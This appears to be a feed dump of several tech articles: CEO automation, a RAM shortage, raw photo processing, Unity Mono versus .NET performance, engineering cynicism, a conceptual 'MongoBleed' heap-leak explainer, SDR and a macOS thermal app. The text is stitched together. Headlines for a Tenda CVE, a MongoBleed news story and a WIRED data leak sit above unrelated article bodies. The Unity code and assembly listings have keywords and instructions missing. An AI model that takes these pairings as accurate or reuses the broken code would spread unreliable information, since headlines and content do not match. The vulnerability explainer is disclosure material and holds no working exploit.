Carrillo’s job, they should be paid 50 per cent more than her. But as Carrillo – with a frankly breathtaking lack of self-awareness – informed another commenter, her EA is based in the Philippines. The main (and often the only) reason to outsource a role is to pay less for it.If most of a CEO’s job can be outsourced, this suggests it could also be automated. But while companies are racing to automate entry- and mid-level roles, senior executives and decision makers show much less interest in automating themselves.There’s a good argument for automating from the top rather than from the bottom. As we know from the annotated copy of  that sits (I assume) on every CEO’s Isamu Noguchi nightstand, human decision-making is the product of irrational biases and assumptions. This is one of the reasons strategy is so difficult, and roles that involve strategic decision-making are so well paid. But the difficulty of making genuinely rational strategic decisions, and the cost of the people who do so, are also good reasons to hand this work over to software.Automating jobs can be risky, especially in public-facing roles. After Microsoft sacked a large team of journalists in 2020 in order to replace them with AI, it almost immediately had to contend with the PR disaster of the software’s failure to distinguish between two women of colour. Amazon had to abandon its AI recruitment tool after it learned to discriminate against women. And when GPT-3, one of the most advanced AI language models, was used as a medical chatbot in 2020, it responded to a (simulated) patient presenting with suicidal ideation by telling them to kill themselves.What links these examples is that they were all attempts to automate the kind of work that happens without being scrutinised by lots of other people in a company. Top-level strategic decisions are different. They are usually debated before they’re put into practice – unless, and this is just another reason to automate them, employees feel they can’t speak up for fear of incurring the CEO’s displeasure.Where automated management – or “decision intelligence”, as Google and IBM call it – has been deployed, it’s produced impressive results. Hong Kong’s mass transit system put software in charge of scheduling its maintenance in 2004, and enjoys a reputation as one of the world’s most punctual and best-run metros.   Clearly, chief execs didn’t get where they are today by volunteering to clear out their corner offices and hand over their caviar spittoons to robots. But management is a very large variable cost that only seems to increase – Persimmon’s bonus scheme paid out half a billion pounds to 150 execs in a single year – while technology moves in the other direction, becoming cheaper and more reliable over time.It is often asked whether CEO pay is fair or ethical. But company owners and investors should be asking if their top management could be done well by a machine – and if so, why is it so expensive?]]></content:encoded></item><item><title>CVE-2025-15160 - Tenda WH450 PPTPServer stack-based overflow</title><link>https://cvefeed.io/vuln/detail/CVE-2025-15160</link><author></author><category>vulns</category><pubDate>Sun, 28 Dec 2025 23:15:52 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-15160

                The world has a memory problem, thanks to artificial intelligence.The explosion in AI-related cloud computing and data centers has led to so much demand for certain types of memory chips that now there's a shortage. The imbalance is expected to start affecting prices of all sorts of products powered by technology."I keep telling everybody that if you want a device, you buy it now," said Avril Wu, a senior research vice president at TrendForce, a Taiwan-based consultancy that tracks markets for computer components. "I myself bought an iPhone 17 already,"The chips are known as RAM, or random access memory, and are crucial to making sure that things like smartphones, computers and game consoles run smoothly. Chips allow you to keep multiple tabs open in browsers, for instance, or watch videos without them being choppy.Wu said TrendForce's data indicates that demand for RAM chips exceeds supply by 10% – and it's growing so fast that manufacturers are having to shell out a lot more to buy them each month.Wu said this quarter alone, they're paying 50% more than the previous quarter for the most common type of RAM, known as DRAM – dynamic random access memory. And if producers want the chips sooner, they're paying two to three times more.Wu expects DRAM prices to rise another 40% in the coming quarter, and she doesn't expect the prices to go down in 2026.How AI is gobbling up memoryAI data centers require huge amounts of memory to accompany their cutting-edge graphics processing unit (GPU) microprocessors that train and operate AI models."AI workloads are built around memory," said Sanchit Vir Gogia, CEO of the tech advisory firm Greyhound Research.What's more, AI companies are spending billions of dollars constructing data centers at warp speed around the world. It's the reason why Gogia says the demand for these chips isn't just a cyclical blip."AI has changed the nature of demand itself," he said. "Training and inference systems require large, persistent memory footprints, extreme bandwidth, and tight proximity to compute. You cannot dial this down without breaking performance."More chips for AI means fewer  chips for other productsIdaho-based Micron Technology is one of the world's top makers of RAM and it's benefited from this increase in demand. It reported better-than-expected quarterly earnings last week on the back of higher memory chip prices.CEO Sanjay Mehrotra said the company expected the market to remain strong, as the AI boom continues apace. "We believe that the aggregate industry supply will remain substantially short of the demand for the foreseeable future," he said on a webcast after the earnings report.Chipmakers like Micron have  to meet as much of the lucrative AI-related demand for high-end memory as they can, according to analysts. That translates into fewer chips for other segments of the market – personal computers, mobile phones, games and consumer products like TVs.And that means higher costs. Dell Technologies Chief Operating Officer Jeff Clarke noted the higher costs on an  on Nov. 25. For PC's, he said "I don't see how this will certainly not make its way into the customer base."Analysts say there is no short-term fix.Tech consultant Wu said the memory chip industry faces a significant bottleneck. By the end of 2026, she said, chip makers will have maxed out how much they can expand production in their current facilities.She said the next new factory expected to come online is being built by Micron in Idaho. The company says it will be operational in 2027.Expect suppliers to keep raising prices for the foreseeable future, Wu said.]]></content:encoded></item><item><title>What an unprocessed photo looks like</title><link>https://maurycyz.com/misc/raw_photo/</link><author>zdw</author><category>dev</category><pubDate>Sun, 28 Dec 2025 22:35:02 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[



(Photography) 


Here’s a photo of a Christmas tree, as my camera’s sensor sees it:It’s not even black-and-white, it’s gray-and-gray.This is becuase while the camera’s analog-to-digital converter (ADC) output can theoretically output values from 0 to 16382, the data doesn’t cover that whole range:The real range of ADC values is ~2110 to ~136000.
Let’s set those values as the white and black in the image:V = (V - Black)/(White - Black)Much better, but it’s still more monochromatic then I remember the tree being.
Camera sensors aren’t actually able to see color: They only measure how much light hit each pixel.In a color camera, the sensor is covered by a grid of alternating color filters:Let’s color each pixel the same as the filter it’s looking through:This version is  more colorful, but each pixel only has one third of it’s RGB color.
To fix this, I just averaged the values each pixel with it’s neighbors:Applying this process to the whole photo gives the lights some color:However, the image is still very dark.
This is because monitors don’t have as much dynamic range as the human eye, or a camera sensor:
Even if you are using an OLED, the screen still has some ambient light reflecting off of it and limiting how black it can get.There’s also another, sneakier factor causing this:Our perception of brightness is non-linear.If brightness values are quantized, most of the ADC bins will be wasted on nearly identical shades of white while every other tone is crammed into the bottom.
Because this is an inefficient use of memory, most color spaces assign extra bins to darker colors:As a result of this, if the linear data is displayed directly, it will appear much darker then it should be.Both problems can be solved by applying a non-linear curve to each color channel to brighten up the dark areas… but this doesn’t quite work out:Some of this green cast is caused by the camera sensor being intrinsically more sensitive to green light, but some of it is my fault:
There are twice as many green pixels in the filter matrix.
When combined with my rather naive demosaicing, this resulted in the green channel being boosted even higher.In either case, it can fixed with proper white-balance:
Equalize the channels by multipling each one with a constant.However, because the image is now non-linear, I have to go back a step to do this.
Here’s the dark image from before with all the values temporarily scaled up so I can see the problem:… here’s that image with the green taken down to match the other channels:… and after re-applying the curve:This is really just the bare minimum:
I haven’t done any color calibration, the white balance isn’t perfect, the black points are too high, there’s lots of noise that needs to be cleaned up…Additionally, applying the curve to each color channel accidentally desaturated the highlights.
This effect looks rather good — and is what we’ve come to expect from film — but it’s has de-yellowed the star.
It’s possible to separate the luminance and curve it while preserving color.
On it’s own, this would make the LED Christmas lights into an overstaturated mess, but combining both methods can produce nice results.For comparison, here’s the image my camera produced from the same data:Far from being an “unedited” photo: there’s a huge amount of math that’s gone into making an image that nicely represents what the subject looks like in person.There’s nothing that happens when you adjust the contrast or white balance in editing software that the camera hasn’t done under the hood.
The edited image isn’t “faker” then the original: they are different renditions of the same data.In the end, replicating human perception is hard, and it’s made harder when constrained to the limitations of display technology or printed images.
There’s nothing wrong with tweaking the image when the automated algorithms make the wrong call.]]></content:encoded></item><item><title>Unity&apos;s Mono problem: Why your C# code runs slower than it should</title><link>https://marekfiser.com/blog/mono-vs-dot-net-in-unity/</link><author>iliketrains</author><category>dev</category><pubDate>Sun, 28 Dec 2025 21:41:42 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Execution of C# code in Unity’s Mono runtime is slow by today’s standards, much slower than you might expect! Our game runs 2-3x faster on modern .NET compared to Unity’s Mono, and in a few small benchmarks I measured speedups of up to 15x. I’ve spent some time investigating what’s going on and in this article I will present my findings and why everyone should want Unity’s .NET modernization to become production-ready as soon as possible.
	Unity uses the Mono framework to run C# programs and back in 2006 it was one of the only viable multi-platform implementations of .NET.
	Mono is also open-source, allowing Unity to do some tweaks to better suit game development.

	An interesting twist happened nearly 10 years later.
	In 2014, Microsoft began open-sourcing .NET (notably .NET Core later that year) and in June 2016, .NET Core 1.0 shipped with official cross-platform support.
	Since then, the .NET ecosystem gained momentum and lots of improvements have been made, including the Roslyn compiler platform, a new JIT (just-in-time compiler), performance improvements, more features, etc.

	In 2018, Unity engineers discussed that they are working on porting the engine to .NET CoreCLR, the multi-platform version of Common Language Runtime (CLR), a component that runs .NET programs.
	Their main motivations behind this project were performance and convergence.
	In their post they said:
...CoreCLR could be great for Unity game developers, as it will provide a significant boost in performance, by an order of 2x to 5x compare to the Mono runtime sometimes up to x10 on some workload!
	Unfortunately, now it’s the end of 2025 and we still can’t run games on CoreCLR.

	We don’t hear about the performance gap between Mono and .NET much, likely because it is not possible to run games written for Unity under modern .NET.
	But we can still do a direct comparison with code that does not depend on Unity directly.

	Our game has a unique architecture – we strictly separate the game simulation code (business logic) from rendering.
	So much so that the simulation code does not depend on Unity’s libraries and can be compiled and run under any .NET version.

	One day I was debugging an issue in map generation and it was time-consuming because it was taking over 2 minutes to start a game.
	To make debugging faster, I’ve written a unit test, hoping to cut down on the turn-around time since Unity takes 15+ seconds just to crunch new DLLs and reload the domain before the game can be launched and it also initializes rendering stuff that I did not care about.
	When I ran the test, it finished in 40 seconds.
	I was quite surprised that it was more than 3x faster, so I started digging deeper.

	Long story short, Figure 1 shows traces from a profiler showing the difference between the game launching in Unity running under Mono vs. a unit test running under .NET.
Note that all shown benchmarks are using either Unity 6.0 or .NET 10.
	So our benchmark shows that loading a save file, generating a map, and initializing the simulation takes 100 seconds in Unity/Mono but only 38 seconds in .NET.
	This result alone is already something that may raise eyebrows and has real consequences of how you may want to approach debugging and testing.

	I also know from experience with Unity that Release mode running as a standalone executable (without the Unity editor) is much faster, so I decided to test that next.
.NET vs. Mono in standalone Release mode
	Debug mode slowness is not great, but even non-optimized C++ code can be slow.
	To compare the real performance gap between Mono and .NET, let’s run the same benchmark as above but in release mode, standalone executable.

	First up: Unity. I’ve run our deploy script to get an optimized executable and run it directly.
	Unsurprisingly, optimized standalone executable is beating Unity editor by a big margin, more than 3x faster.
	Next, the same code running under .NET in Release mode.
	Figure 2 shows the results.

	Yep. 12 seconds.
	It’s actually mind-boggling how much work is being done in these 12 seconds and when I saw this for the first time, I was not only shocked, but also impressed.
	Just so you know, a 4k × 4k map is being generated using all available threads out of hundreds of combined noise functions in like 3 seconds.
	Figure 3 shows the trace expanded.

	If you are interested in seeing the actual x86 assembly generated by Mono and .NET JITs, see the Extras section at the end of this article.

	As you can see from the presented benchmarks, Mono is massively behind .NET in terms of performance.
	This is primarily due to differences in runtime optimizations and JIT that generates unoptimized assembly.
	The actual speedup surely depends on the code itself, but from my research, 1.5-3x speedup of C# execution is very likely for most projects.

	If you are a game developer using Unity, or even a player, you can now understand that CoreCLR would be a massive boost to performance of games and even the Unity editor.
	Unfortunately, for the past 8 years, Unity leadership was more interested in “other things” and did not give .NET modernization the attention it deserves.

	Some view .NET modernization as support for new language features in C#, but that is just a cherry on top.
	New C# adds some handy features, but the new JIT can deliver multi-x speedups.

	At this year's Unite conference, Unity announced
	that CoreCLR is still ongoing but it won’t be production ready in 2026.
	The good news is that it now seems to be on the Unity 6.x roadmap, and not left for later versions as suggested by 2024’s Unite presentation.

	Moreover, CoreCLR is not just new JIT and C#, it unlocks broader and better-optimized support for things like Span<T>-style APIs, hardware intrinsics, and newer SIMD paths that devs cannot use these days.
	These features could add another multiplier to the performance gains for some classes of code.
	For example, our map generator heavily uses 2D and 3D simplex noise.
	I bet that having access to new runtime features in CoreCLR could speed up the map generation by another 2x.

	Unity has a technology called Burst that automatically converts marked C# methods to optimized native assembly via the LLVM compiler.
	This sounds neat as it can avoid the poor JIT performance, but the downside is that Burst has strict limitations on what can be converted and supports only subset of C#.
	I believe that CoreCLR with modern JIT will have very similar performance characteristics to Burst.
	I am curious what would happen in a universe where Unity invested all the time and effort in CoreCLR support and high-performance C#, instead of developing and maintaining Burst.

	Another interesting consequence of CoreCLR support is the ability to pre-compile the .NET intermediate assembly to machine code using ahead-of-time compilation (AOT).
	AOT can further improve startup time and is essential on platforms where JIT is restricted (notably iOS).
	Nowadays, Unity solves this with IL2CPP that takes the intermediate code and compiles it to C++ which is then optimized and compiled to native assembly.
	However, according to RichardFine (Unity staff),
	using CoreCLR AOT is not planned and IL2CPP is here to stay:
AOT for IL2CPP is completely independent of AOT for CoreCLR (which we have no plans to adopt anyway).
GC behaviour on IL2CPP improves when we upgrade the GC there, it’s not really affected by CoreCLR at all.
	In conclusion, CoreCLR won’t magically fix every bottleneck in a Unity game, but it does fix many of the code generation inefficiencies and allows writing higher-performance code.
	The benchmark presented in this article is meant to illustrate that modern .NET has spent years squeezing more work into fewer CPU cycles, and Unity users are largely locked out of those gains today.

	If Unity can deliver production-ready CoreCLR support, it won’t just mean “newer C#”.
	It will mean faster runtime performance, faster iteration times, more performance headroom, no domain reload, 
	better GC behavior, and maybe even more managed code and less native code. 
	Until then, the gap will remain an invisible tax on every Unity project that leans on managed code.

	I’m cheering for you, Unity devs, CoreCLR for the win!
Extras: Comparison of x86 assembly
	I have actually dug much deeper into the performance aspects of Mono vs .NET but for the sake of this article not being too long, here is a brief summary.
Code listing 1 shows the testing code.
	It does some basic summing of custom structs that are wrappers around ints.
	This is an interesting example because Mono is very bad at inlining and simplifying expressions, even obvious ones, and we have plenty of structs like these in our code base (e.g. Quantity, MechPower, Tile2i, etc).

 Program {

	 Main() {
		Console.WriteLine(RunTest(.MaxValue));
	}

	 TestStruct RunTest( iterations) {
		TestStruct value1 =  TestStruct(iterations % 2);
		TestStruct value2 =  TestStruct(iterations % 7);
		TestStruct value3 =  TestStruct(iterations % 13);

		TestStruct result = ;

		 ( i = 0; i < iterations; ++i) {
			result += value1 + value2;
			result += value1 + value3;
		}

		 result;
	}

}

 TestStruct {

     Value;

     TestStruct( value) {
        Value = value;
    }

     TestStruct  +(TestStruct lhs, TestStruct rhs) {
         TestStruct(lhs.Value + rhs.Value);
    }

     ToString() => Value.ToString();

}
	To obtain assembly code, I’ve compiled the code in Release mode and ran it as a standalone executable.
	Then, I attached a debugger to the running process. An easy way to find this loop was to make it long/infinite and just break the program at any time, it would end up in that loop.

	First, let’s take a look at .NET. Here is the x64 assembly of the for-loop section of the code.
 r8d,edx
 edx,r10d
00007FFDEC338E88:
      r10d,r8d
      r9d,r10d
      r10d,edx
      r9d,r10d
      ecx
      ecx,eax
       00007FFDEC338E88
	In both cases, the full loop of  iterations took around 750 ms on my machine.

	This looks neat. Even if you don’t read assembly, you can see that there are two add instructions, one decrement, and one jump.
	It seems that the JIT hoisted the invariant sums  and  out of the loop and then just accumulates them.

	I also tested x86 assembly, and it looks very similar:
082E18D0:
      ebx,[esi+edi]
      eax,ebx
      ebx,[esi+edx]
      eax,ebx
      ecx
      082E18D0
	Interestingly, the loop direction was reversed, counting down.
	This saves one instruction as comparison to zero and conditional jump can be done as one instruction.

	Now let’s look at Mono’s x64 assembly.

	As you can see just from the number of instructions, this code will run way slower.
	The full loop of  iterations took around 11500 ms, that’s ~15x slower.

	In the assembly you can see the four add instructions in the loop, the “inefficient” increment + comparison + jump (instead of decrement + conditional jump), and most importantly a sea of mov instructions, which are just memory copies from inefficient inlining of the struct fields.
	Basically Mono is just tossing values around memory.

	I have also tested assembly compiled in Debug mode running in the Unity editor and it’s even worse.
	The full loop takes 67 seconds (67000 ms)! In Unity Editor, the JIT likely switches to far less optimized codegen and includes additional checks/sequence-point overhead, which balloons runtime.

	Takeaway: modern .NET’s JIT can scalarize tiny value types and hoist invariant work so the hot loop becomes a handful of register ops, while Mono often fails to do so and ends up shuffling values through memory, exactly the kind of gap that shows up as slowdowns in real simulation-heavy code.

But what is lost is any sort of conception of value. Is it too naive to say that engineers are more than “tools in a political game”, they are specialized professionals whose role is to apply their expertise towards solving meaningful problems?The irony is that this kind of thinking destroys a company’s ability to actually make money … the idea that engineers should begin with a self-conception of doing what their manager tells them to is, to me, very bleak. It may be a good way to operate smoothly within a bureaucratic organization, and of course, one must often make compromises and take direction, but it is a bad way to do good work.I can see why people would think this way. But I  working in big tech companies! I do see myself as a professional solving meaningful problems. And I think navigating the organization to put real features or improvements in the hands of users is an excellent way - maybe the best way - to do good work.Why do I write such cynical posts, then? Well, I think that a small amount of cynicism is necessary in order to think clearly about how organizations work, and to avoid falling into the trap of being overly cynical. In general, I think good engineers ought to be a little bit cynical.The idealist view is more cynical than idealists thinkOne doctrinaire “idealist” view of software engineering goes something like this. I’m obviously expressing it in its most lurid form, but I do think many people believe this more or less literally:We live in a late-stage-capitalist hellscape, where large companies are run by aspiring robber barons who have no serious convictions beyond desiring power. All those companies want is for obedient engineering drones to churn out bad code fast, so they can goose the (largely fictional) stock price. Meanwhile, end-users are left holding the bag: paying more for worse software, being hassled by advertisements, and dealing with bugs that are unprofitable to fix. The only thing an ethical software engineer can do is to try and find some temporary niche where they can defy their bosses and do real, good engineering work, or to retire to a hobby farm and write elegant open-source software in their free time.When you write it all out, I think it’s clear to see that this is  cynical. At the very least, it’s a cynical way to view your coworkers and bosses, who are largely people like you: doing a job, balancing a desire to do good work with the need to please their own bosses. It’s a cynical way to view the C-staff of a company. I think it’s also inaccurate: from my limited experience, the people who run large tech companies really do want to deliver good software to users.It’s idealistic only in the sense that it does not accept the need for individual software engineers to compromise. According to this view,  never need to write bad software. No matter how hard the company tells you to compromise and just get something out, you’re morally required to plant your feet and tell them to go to hell. In fact, by doing so, you’re taking a stand against the general degeneration of the modern software world. You’re protecting - unsung, like Batman - the needs of the end-user who will never know you exist.I can certainly see the appeal of this view! But I don’t think it’s an  appeal. It comes from seeing the world as fundamentally corrupted and selfish, and believing that real positive change is impossible. In other words, I think it’s a  appeal.The cynical view is more idealistic than idealists thinkI don’t see a hard distinction between engineers being “tools in a political game” and professionals who solve meaningful problems. In fact, I think that in practice almost all meaningful problems are solved by playing political games.There are very few problems that you can solve entirely on your own. Software engineers encounter more of these problems than average, because the nature of software means that a single engineer can have huge leverage by sitting down and making a single code change. But in order to make changes to large products - for instance, to make it possible for GitHub’s 150M users to use LaTeX in markdown - you need to coordinate with many other people at the company, which means you need to be involved in politics.It is just a plain fact that software engineers are not the movers and shakers in large tech organizations. They do not set the direction of the company. To the extent that they have political influence, it’s in how they translate the direction of the company into specific technical changes. But that is actually quite a lot of influence!Large tech companies serve hundreds of millions (or billions) of users. Small changes to these products can have a massive positive or negative effect in the aggregate. As I see it, choosing to engage in the messy, political process of making these changes - instead of washing your hands of it as somehow impure - is an act of idealism. I think the position of a software engineer in a large tech company is similar to people who go into public service: idealistically hoping that they can do some good, despite knowing that they themselves will never set the broad strokes of government policy.Of course, big-tech software engineers are paid far better, so many people who go into this kind of work in fact are purely financially-motivated cynics. But I’m not one of them! I think it’s possible, by doing good work, to help steer the giant edifice of a large tech company for the better.Cynical writing is like most medicines: the dose makes the poison. A healthy amount of cynicism can serve as an inoculation from being overly cynical.If you don’t have an slightly cynical explanation for why engineers write bad code in large tech companies - such as the one I write about here - you risk adopting an overly cynical one. For instance, you might think that big tech engineers are being deliberately demoralized as part of an anti-labor strategy to prevent them from unionizing, which is nuts. Tech companies are simply not set up to engage in these kind of conspiracies.If you don’t have a slightly cynical explanation for why large tech companies sometimes make inefficient decisions - such as this one - you risk adopting an overly cynical one. For instance, you might think that tech companies are full of incompetent losers, which is simply not true. Tech companies have a normal mix of strong and weak engineers.Idealist writing is massively over-represented in writing about software engineering. There is no shortage of books or blog posts (correctly) explaining that we ought to value good code, that we ought to be kind to our colleagues, that we ought to work on projects with positive real-world impact, and so on. There  a shortage of writing that accurately describes how big tech companies operate.Of course, cynical writing can harm people: by making them sad, or turning them into bitter cynics. But idealist writing can harm people too. There’s a whole generation of software engineers who came out of the 2010s with a  model of how big tech companies work, and who are effectively being fed into the woodchipper in the 2020s. They would be better off if they internalized a correct model of how these companies work: not just less likely to get into trouble, but better at achieving their own idealist goals.edit: this post got some traction on Hacker News, with many comments. Some commenters said that it’s incoherent to say “what I do is good, actually” when my employer is engaged in various unethical activity. Fair enough! But this post isn’t about whether it’s ethical to work for Microsoft or not. It’s a followup to How good engineers write bad code at big companies - the main cynicism I’m interested in here is not “big tech is evil”, but “big tech is incompetent”.Some othercommenters challenged my claim that C-staff want to deliver good software by pointing out that they’re not willing to trade off their personal success to do so. Sure, I agree with that. The kind of person willing to sacrifice their career for things doesn’t typically make it to a C-level position. But it’s not always zero-sum. Good software makes money for software companies, after all.I also saw two commenters link this as an example of big tech companies actually being engaged in conspiracies against their employees. I’m not convinced. Companies  structurally set up to collude on salaries, but they’re not set up to deliberately make their employees sad - they just don’t have that kind of fine-grained control over the culture! To the extent they have any control, they try to make their employees happy so they’ll work for less money and not leave.]]></content:encoded></item><item><title>MongoBleed Explained Simply</title><link>https://bigdata.2minutestreaming.com/p/mongobleed-explained-simply</link><author>todsacerdoti</author><category>dev</category><pubDate>Sun, 28 Dec 2025 21:03:03 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Let’s get a few basics out of the way before we explain the bug:MongoDB uses its own TCP wire protocol instead of e.g HTTP. This is standard for databases, especially ones chasing high performance.BSONMongo doesn’t have endpoints or RPCs. It only uses a single op code called OP_MSG. which wrapsThe request then looks like this:     OP_COMPRESSED message
┌────────────────────────────┐
│ standard header (16 bytes) │
├────────────────────────────┤
│ originalOpcode (int32)     │
│ uncompressedSize (int32)   │
│ compressorId (int8)        │
│ compressed OP payload      │
└────────────────────────────┘The first part of the exploit is to get the server to wrongfully think that an overly-large OP_MSG is coming.The critical bug here is that, once finished decompressing, the server does NOT check the actual resulting size of the newly-uncompressed payload.The result is an in-memory representation of the BSON message which looks something like this:[ 1KB of REAL DATA |      999KB of UNREFERENCED HEAP GARBAGE       ]
                   ↑                                               ↑
        actual length (1KB)                     user input length (1MB)Like in every programming language, when a variables in the code goes out of scope, the runtime marks the memory it previously took up as available.In most modern languages, the memory gets zeroed out. In other words, the old bytes that used to take up the space get deleted.Since Mongo is writen in C++, that unreferenced heap garbage part can represent anything that was in memory from previous operations, including:Cleartext passwords and credentialsSession tokens / API keysDatabase configs and system infoDocker paths and client IP addresses[ REAL BSON DATA | password: 123 | apiKey: jA2sa | ip: 219.117.127.202 ]Now that the server has wrongfully allocated some potentially-sensitive data to the input message, the only thing left for the attacker is to somehow get the server return the data.As mentioned on its siteThe way such strings get parsed is very simple - the deserializer reads every character until it finds a null terminator.If you recall, I said earlier that the first field of the BSON message denotes what type of “RPC” the command is.As such, the first thing a server does when handling an incoming message over the wire is… parse the first field!Because fields are strings, and strings are null-terminated CStrings, the deserializing logic in the MongoDB server parses the field until the first null terminator found.# Conceptual
[ REAL DATA |             UNREFERENCED HEAP GARBAGE                 ]
# Practical Example
[ { "a      | password: 123\0 | apiKey: jA2sa | ip: 219.117.127.202 ]As the first null terminator is right after the password, the server would now think that the first field of the BSON is:Obviously that is an invalid BSON field, so the server responds with an error to the client. In order to be helpful, the response contains an error message that shows which field was invalid:Boom. The attacker successfully got the server to leak data to it.Any serious attacker would then run this over and over again, thousands of time a second, until they believe they’ve scanned the majority of the database’s heap. They can then repeat this ad infinitum.before any authentication can be madeMay 2017It is unknown whether the exploit was known and exploited by actors prior to its disclosure. Given the simplicity of it, I bet it was.As of the exploit’s disclosure, which happened on 19th of December, it has been a race to patch the database.a community disclosureonlineanecdotes Mongo says that they haven’t verified exploitation so far:“at this time, we have no evidence that this issue has been exploited or that any customer data has been compromised”Mitigation is admittedly very easy, you have one of two choices:I found the latter wasn’t circulated a lot in online talk, but I understand is just as good as a short-term mitigation.The exploit allows attackers to read arbitrary heap data, including user data, plaintext passwords, api keys/secrets, and more.It is performed by leveraging a simple, malformed zlib-compressed request.MongoDB versions from 2017-2025 are vulnerable to this exploit.On Dec 24th, MongoDB reported they have no evidence of anybody exploiting the CVE. Given the fact this exploit lived on for ~8 years and is extremely simple to both exploit and uncover… I am sure it was exploited.MongoDB have not apologized yet.over 213k+]]></content:encoded></item><item><title>Exploited MongoBleed flaw leaks MongoDB secrets, 87K servers exposed</title><link>https://www.bleepingcomputer.com/news/security/exploited-mongobleed-flaw-leaks-mongodb-secrets-87k-servers-exposed/</link><author>Ionut Ilascu</author><category>security</category><pubDate>Sun, 28 Dec 2025 20:38:15 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A severe vulnerability affecting multiple MongoDB versions, dubbed MongoBleed (CVE-2025-14847), is being actively exploited in the wild, with over 80,000 potentially vulnerable servers exposed on the public web.

This software can be run on a general-purpose computer (CPU), FPGA, or even GPU, and it can be used for real-time applications or offline processing of recorded signals.  Analogous terms include “software radio” and “RF digital signal processing”.As a  (e.g., “an SDR”) it typically refers to a device that you can plug an antenna into and receive RF signals, with the digitized RF samples being sent to a computer for processing or recording (e.g., over USB, Ethernet, PCI).  Many SDRs also have transmit capabilities, allowing the computer to send samples to the SDR which then transmits the signal at a specified RF frequency.  Some embedded-style SDRs include an onboard computer.The digital processing of signals; in our case, RF signals.This textbook acts as a hands-on introduction to the areas of DSP, SDR, and wireless communications.  It is designed for someone who is:Interested in  SDRs to do cool stuffRelatively new to DSP, wireless communications, and SDRA visual learner, preferring animations over equationsBetter at understanding equations  learning the conceptsLooking for concise explanations, not a 1,000 page textbookAn example is a Computer Science student interested in a job involving wireless communications after graduation, although it can be used by anyone itching to learn about SDR who has programming experience.  As such, it covers the necessary theory to understand DSP techniques without the intense math that is usually included in DSP courses.  Instead of burying ourselves in equations, an abundance of images and animations are used to help convey the concepts, such as the Fourier series complex plane animation below.  I believe that equations are best understood  learning the concepts through visuals and practical exercises.  The heavy use of animations is why PySDR will never have a hard copy version being sold on Amazon.This textbook is meant to introduce concepts quickly and smoothly, enabling the reader to perform DSP and use SDRs intelligently.  It’s not meant to be a reference textbook for all DSP/SDR topics; there are plenty of great textbooks already out there, such as Analog Device’s SDR textbook and dspguide.com.  You can always use Google to recall trig identities or the Shannon limit.  Think of this textbook like a gateway into the world of DSP and SDR: it’s lighter and less of a time and monetary commitment, when compared to more traditional courses and textbooks.To cover foundational DSP theory, an entire semester of “Signals and Systems”, a typical course within electrical engineering, is condensed into a few chapters.  Once the DSP fundamentals are covered, we launch into SDRs, although DSP and wireless communications concepts continue to come up throughout the textbook.Code examples are provided in Python.  They utilize NumPy, which is Python’s standard library for arrays and high-level math.  The examples also rely upon Matplotlib, which is a Python plotting library that provides an easy way to visualize signals, arrays, and complex numbers.  Note that while Python is “slower” than C++ in general, most math functions within Python/NumPy are implemented in C/C++ and heavily optimized.  Likewise, the SDR API we use is simply a set of Python bindings for C/C++ functions/classes.  Those who have little Python experience yet a solid foundation in MATLAB, Ruby, or Perl will likely be fine after familiarizing themselves with Python’s syntax.]]></content:encoded></item><item><title>Hacker claims to leak WIRED database with 2.3 million records</title><link>https://www.bleepingcomputer.com/news/security/hacker-claims-to-leak-wired-database-with-23-million-records/</link><author>Lawrence Abrams</author><category>security</category><pubDate>Sun, 28 Dec 2025 17:57:34 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A hacker claims to have breached Condé Nast and leaked an alleged WIRED database containing more than 2.3 million subscriber records, while also warning that they plan to release up to 40 million additional records for other Condé Nast properties.

However, when using an external display, especially a very demanding one like a 4K 120Hz display, I’ve noticed it started struggling more. Since it lacks fans, you can’t hear it struggling, but you can feel it as everything becomes very slow or unresponsive: that’s when thermal throttling kicks in.I know it’s thermal throttling because I can see in iStat Menus that my CPU usage is 100% while the power usage in watts goes down.It’s even more obvious with MX Power Gadget: You can see the power usage and frequency of the performance core dropping, as usage keeps being 100%:I’ve also hit thermal throttling with my work MacBook Pro. It’s the 14" M4 Max variant, which is the worst variant because the thermal envelope of the 14" is too small for the max output for the M4 Max. On my previous 14" M1 Pro MacBook Pro, I’ve never even heard the fans in 3 years…That being said, I still love Apple Silicon for the performance and power usage, it’s still a dramatic improvement over the Intel days. 🫶Anyway, I wanted to know: is there a way to tell if the Apple Silicon SoC is thermal throttling, that is not based on heuristics like in my screenshot?Getting the thermal state programmatically This was a wilder ride than I expected. It’s possible to know programmatically if the Mac is throttled, because macOS exposes this in various but inconsistent ways.Sounds good, right? However, I knew that another tool could provide this information, though it needed root: .(yes the output has that many newlines)Both report the pressure level to be “nominal”, they must be the same…right?After running a few stress tests , I started to see the two values diverge!For some reason, the granularity is different between  and . They have a different amount of possible states and they don’t line up.Here is my empirical experience:I never managed to hit these states, so I don’t know if they match, but they’re technically defined:In practice, when my Mac starts getting hot, from the  perspective it goes into , and when it starts throttling, it goes into . The problem is that with , both are covered by the  state, so it’s not really useful to know when the Mac is  throttling. ☹️I stumbled upon this article from Dave MacLachlan, a Googler working on Apple stuff, from 2020. I learned that there are other CLI tools to get thermal data, but they don’t seem to work on my Apple Silicon MacBook:But the most interesting thing I learned is that the data  shows is actually coming from . And  writes the current thermal pressure to the Darwin notification system ()!The various levels are defined in  according to the article. Indeed:The funny thing is that  is barely referenced anywhere, there are only three pages of Google results. It seems to be used in Bazel for example. That post was a big help.What’s great about this approach is that it doesn’t require root! I can subscribe to the notification system for the com.apple.system.thermalpressurelevel event to get the (good) thermal state!Here is a snippet to get it in Swift:Now that I had a useful value to work with, it was time to build the app.Armed with Opus 4.5, I set out to build a little menu bar app where I could see, at a glance, if my Apple Silicon die was trying to save itself from crossing 110°C. I called it MacThrottle.I built a simple SwiftUI app for the menu bar that shows me the status in a superbly original thermometer icon. The thermometer is filled depending on the thermal state, and its color changes from green to red. I have like 20 menu bar icons and they’re all monochromatic, so the color in the thermometer is very subtle to keep things consistent.The app is a simple SwiftUI app. Apple provides a scene called MenuBarExtra to render a menu bar control. 